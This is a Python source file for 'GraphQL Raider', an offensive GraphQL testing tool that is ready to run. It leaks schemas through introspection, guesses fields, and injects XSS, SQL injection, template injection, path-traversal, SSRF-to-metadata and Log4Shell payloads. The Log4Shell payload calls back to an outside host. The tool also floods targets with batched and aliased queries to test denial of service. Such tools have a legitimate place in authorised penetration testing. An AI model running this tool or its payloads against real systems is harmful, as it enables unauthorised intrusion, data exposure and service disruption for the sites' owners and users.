#!/usr/bin/python3
"""
GraphQL Raider — GraphQL security testing tool.
Inspired by InQL and GraphQL Voyager.

Tests for:
  - Schema introspection (leaks full API structure)
  - Field-level injection (XSS, SQLi, SSTI in every query argument)
  - Batch query DoS (many operations in one request)
  - Alias-based field duplication (amplification)
  - Introspection disabled? → field name guessing
  - Mutation enumeration
  - Auth bypass via introspection on unauthorized queries

Usage:
  ../.venv/bin/python3 modules/graphql_raider.py -u https://target.com/graphql
  ../.venv/bin/python3 modules/graphql_raider.py -u https://target.com/graphql --introspect
  ../.venv/bin/python3 modules/graphql_raider.py -u https://target.com/graphql --inject
  ../.venv/bin/python3 modules/graphql_raider.py -u https://target.com/graphql --batch 100
"""
import argparse
import json

import requests
import urllib3

from core.colors import bold, underline, end, red, yellow, green, run, good, bad, info, tab

urllib3.disable_warnings()

UA = {"User-Agent": "Mozilla/5.0 (compatible; Catch403/1.0)"}
TIMEOUT = 15

INTROSPECTION_QUERY = """
{
  __schema {
    queryType  { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name kind description
      fields(includeDeprecated: true) {
        name description isDeprecated deprecationReason
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind ofType { name kind } } }
      }
      inputFields {
        name type { name kind ofType { name kind } }
      }
      enumValues(includeDeprecated: true) { name }
    }
    directives { name locations args { name } }
  }
}
"""

INJECTION_PAYLOADS = [
    ("XSS",        '<script>alert(1)</script>'),
    ("SQLi basic", "' OR '1'='1"),
    ("SQLi union", "' UNION SELECT NULL--"),
    ("SSTI Jinja", "{{7*7}}"),
    ("SSTI ERB",   "<%= 7*7 %>"),
    ("Path trav",  "../../../../etc/passwd"),
    ("Log4Shell",  "${jndi:ldap://ppl4zm.oast.me/a}"),
    ("SSRF",       "http://169.254.169.254/latest/meta-data/"),
]

COMMON_ENDPOINTS = [
    "/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
    "/api", "/api/v1", "/api/v2", "/query", "/gql",
]

COMMON_FIELD_GUESSES = [
    "user", "users", "me", "profile", "account", "admin",
    "login", "register", "password", "email", "token",
    "post", "posts", "article", "articles", "comment", "comments",
    "order", "orders", "product", "products", "file", "files",
    "search", "query", "node", "nodes", "viewer",
]


def _gql_post(url: str, query: str, variables: dict | None = None,
              headers: dict | None = None, cookies: dict | None = None) -> dict | None:
    h = {**UA, "Content-Type": "application/json", **(headers or {})}
    body = {"query": query}
    if variables:
        body["variables"] = variables
    try:
        r = requests.post(url, json=body, headers=h, cookies=cookies or {},
                          timeout=TIMEOUT, verify=False)
        return {"status": r.status_code, "body": r.json(), "raw": r.text}
    except Exception as e:
        return {"status": None, "body": None, "raw": str(e)}


def discover_endpoint(base_url: str, headers: dict | None = None) -> str | None:
    """Try common GraphQL paths."""
    print(f"  {run} Discovering GraphQL endpoint…")
    for path in COMMON_ENDPOINTS:
        url = base_url.rstrip("/") + path
        resp = _gql_post(url, "{ __typename }", headers=headers)
        if resp and resp["status"] == 200 and resp["body"]:
            data = resp["body"]
            if isinstance(data, dict) and ("data" in data or "errors" in data):
                print(f"  {good} Found endpoint: {green}{url}{end}")
                return url
    return None


def introspect(url: str, headers: dict | None = None) -> dict | None:
    """Run full schema introspection."""
    print(f"  {run} Introspecting schema…")
    resp = _gql_post(url, INTROSPECTION_QUERY, headers=headers)
    if not resp or not resp["body"]:
        print(f"  {bad} Introspection failed — no response")
        return None
    if "errors" in (resp["body"] or {}):
        errs = resp["body"]["errors"]
        print(f"  {bad} Introspection errors: {errs[0].get('message','?')}")
        return None
    schema = resp["body"].get("data", {}).get("__schema")
    if schema:
        print(f"  {good} Introspection {green}enabled{end} — schema retrieved")
        return schema
    return None


def parse_schema(schema: dict) -> dict:
    """Extract queries, mutations, and field names from schema."""
    result = {"queries": [], "mutations": [], "types": {}}
    if not schema:
        return result

    query_type    = (schema.get("queryType")    or {}).get("name", "Query")
    mutation_type = (schema.get("mutationType") or {}).get("name", "Mutation")

    for t in schema.get("types", []):
        name = t.get("name", "")
        if name.startswith("__"):
            continue
        fields = [f["name"] for f in (t.get("fields") or [])]
        result["types"][name] = fields

        if name == query_type:
            result["queries"] = fields
        if name == mutation_type:
            result["mutations"] = fields

    return result


def inject_fields(url: str, fields: list[str], headers: dict | None = None) -> list[dict]:
    """Inject payloads into every discovered field argument."""
    findings = []
    print(f"\n  {run} Injecting into {len(fields)} fields…")
    for field in fields:
        for name, payload in INJECTION_PAYLOADS:
            query = f'{{ {field}(id: "{payload}") }}'
            resp = _gql_post(url, query, headers=headers)
            if not resp:
                continue
            body_str = (resp["raw"] or "").lower()
            # Check if payload reflected or triggers error signatures
            if payload.lower() in body_str and resp["status"] == 200:
                findings.append({
                    "field": field, "type": name, "payload": payload,
                    "severity": "medium", "status": resp["status"],
                })
                print(f"  {bad} {red}{name}{end} reflected in field '{field}'")
            elif any(e in body_str for e in ["sql syntax","mysql_fetch","ora-","sqlite","pg_query"]):
                findings.append({
                    "field": field, "type": "SQLi (error)", "payload": payload,
                    "severity": "high", "status": resp["status"],
                })
                print(f"  {bad} {red}SQL error{end} in field '{field}'")
    return findings


def batch_dos(url: str, n: int = 50, headers: dict | None = None) -> dict:
    """Send n identical operations in one request to test batch query DoS."""
    print(f"\n  {run} Testing batch query DoS ({n} operations)…")
    batch = [{"query": "{ __typename }"}] * n
    h = {**UA, "Content-Type": "application/json", **(headers or {})}
    import time
    t0 = time.time()
    try:
        r = requests.post(url, json=batch, headers=h, timeout=30, verify=False)
        elapsed = time.time() - t0
        result = {
            "status": r.status_code, "elapsed_s": round(elapsed, 2),
            "response_len": len(r.content), "accepted": r.status_code == 200,
        }
        if r.status_code == 200 and isinstance(r.json(), list):
            print(f"  {bad} {red}Batch queries ACCEPTED{end} — {n} operations processed in {elapsed:.2f}s")
        else:
            print(f"  {good} Batch queries rejected (status {r.status_code})")
        return result
    except Exception as e:
        print(f"  {bad} Error: {e}")
        return {"error": str(e)}


def alias_amplification(url: str, n: int = 20, headers: dict | None = None) -> dict:
    """Use aliases to request the same expensive field N times."""
    aliases = "\n  ".join(f"a{i}: __typename" for i in range(n))
    query = f"{{ {aliases} }}"
    print(f"\n  {run} Testing alias amplification ({n} aliases)…")
    import time
    t0 = time.time()
    resp = _gql_post(url, query, headers=headers)
    elapsed = time.time() - t0
    if resp and resp["status"] == 200:
        print(f"  {bad} {yellow}Alias amplification{end} — {n} aliases processed in {elapsed:.2f}s")
        return {"accepted": True, "elapsed_s": round(elapsed, 2), "aliases": n}
    print(f"  {good} Aliases appear limited or rejected")
    return {"accepted": False}


def guess_fields(url: str, headers: dict | None = None) -> list[str]:
    """When introspection is disabled, guess field names."""
    print(f"\n  {run} Guessing field names (introspection disabled)…")
    found = []
    for field in COMMON_FIELD_GUESSES:
        resp = _gql_post(url, f"{{ {field} }}", headers=headers)
        if not resp:
            continue
        body = resp["body"] or {}
        errors = body.get("errors", [])
        if not errors:
            found.append(field)
            print(f"  {good} Found: {green}{field}{end}")
        else:
            # "did you mean" hints leak field names
            msg = " ".join(e.get("message","") for e in errors)
            if "did you mean" in msg.lower():
                import re
                suggestions = re.findall(r'"(\w+)"', msg)
                for s in suggestions:
                    if s not in found and s not in COMMON_FIELD_GUESSES:
                        found.append(s)
                        print(f"  {info} Hint leaked: {yellow}{s}{end}")
    return found


def scan(url: str, headers: dict | None = None, cookies: dict | None = None,
         do_inject: bool = True, do_batch: bool = True) -> dict:
    print(f"\n{bold}GraphQL Raider{end} → {url}\n")
    findings = {"url": url, "introspection": False, "schema": {}, "injections": [],
                "batch": None, "amplification": None}

    schema = introspect(url, headers)
    if schema:
        findings["introspection"] = True
        parsed = parse_schema(schema)
        findings["schema"] = parsed
        print(f"\n  {info} Queries    : {green}{', '.join(parsed['queries'][:10])}{end}")
        print(f"  {info} Mutations  : {yellow}{', '.join(parsed['mutations'][:10])}{end}")
        print(f"  {info} Types      : {len(parsed['types'])}")

        if do_inject and parsed["queries"]:
            findings["injections"] = inject_fields(url, parsed["queries"][:20], headers)
    else:
        guessed = guess_fields(url, headers)
        if guessed:
            findings["schema"]["guessed_fields"] = guessed
            if do_inject:
                findings["injections"] = inject_fields(url, guessed, headers)

    if do_batch:
        findings["batch"] = batch_dos(url, 50, headers)
        findings["amplification"] = alias_amplification(url, 30, headers)

    return findings


def main():
    parser = argparse.ArgumentParser(description="GraphQL security testing tool")
    parser.add_argument("-u",  dest="url", required=True, help="GraphQL endpoint URL")
    parser.add_argument("--introspect", action="store_true", help="Introspection only")
    parser.add_argument("--inject",     action="store_true", help="Field injection tests")
    parser.add_argument("--batch",      type=int, metavar="N", help="Batch DoS with N queries")
    parser.add_argument("--discover",   action="store_true", help="Try common endpoint paths")
    parser.add_argument("--header",     action="append", dest="headers", metavar="Name:Value")
    parser.add_argument("--cookie",     default="", help="Cookie string")
    parser.add_argument("-o",           dest="output", help="Save JSON report to file")
    args = parser.parse_args()

    headers = {}
    for h in (args.headers or []):
        k, _, v = h.partition(":")
        headers[k.strip()] = v.strip()

    cookies = {}
    if args.cookie:
        for part in args.cookie.split(";"):
            k, _, v = part.strip().partition("=")
            cookies[k] = v

    url = args.url
    if args.discover:
        found = discover_endpoint(url.rstrip("/"), headers)
        if found:
            url = found
        else:
            print(f"{bad} No GraphQL endpoint found at common paths")
            return

    if args.batch:
        batch_dos(url, args.batch, headers)
        return

    results = scan(url, headers, cookies,
                   do_inject=args.inject or not args.introspect,
                   do_batch=not args.introspect)

    if args.output:
        import json
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{good} Report saved → {args.output}")


if __name__ == "__main__":
    main()
